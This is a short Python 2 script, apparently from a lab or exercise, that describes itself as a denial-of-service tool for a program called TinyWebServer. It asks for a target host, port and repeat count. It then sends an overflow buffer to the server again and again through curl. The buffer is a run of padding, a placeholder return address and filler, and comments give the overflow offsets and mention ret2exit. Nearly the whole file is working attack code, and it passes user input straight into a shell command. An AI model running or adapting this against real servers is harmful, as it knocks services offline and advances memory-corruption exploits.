from os import system

print """
TinyDos.py- a simple Denial-of-Service script for TinyWebServer. 
"""
target = raw_input("Please input the target URI:\n(127.0.0.1) >")
port = raw_input("Input the target port:\n(9999) >")
iters = raw_input("Input number of times to send evil buffer to crash the server:\n(12)>")
if (len(target) == 0):
    target = "127.0.0.1"
if (len(port) == 0):
    port = "9999"
if (len(iters)==0):
    iters = 12
else:
    iters = int(iters)
evil = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"


for i in range(iters-1):
    print "Sending evil buffer number %s of %s" % (i+1, iters)
    comm = "/usr/bin/curl " + str(target) + ":" + str(port) + "/\"" + "A"*560 + "\xef\xbe\xad\xde" + "B"* 10 +"Z"*10 +"Y"*10 +"X"*10 +"W"*10 + "C"*50 + "D"*50 + "E"*50 + "F"*100 + "G"*100 + "H"*100 + "I"*100+ "\"" # \x50\x89\x04\x08 ret2exit \xef\xbe\xad\xde
    system(comm)
    print ""
    
# The evil buffer is 548+retaddr for 32bit and  560+retaddr for 64bit
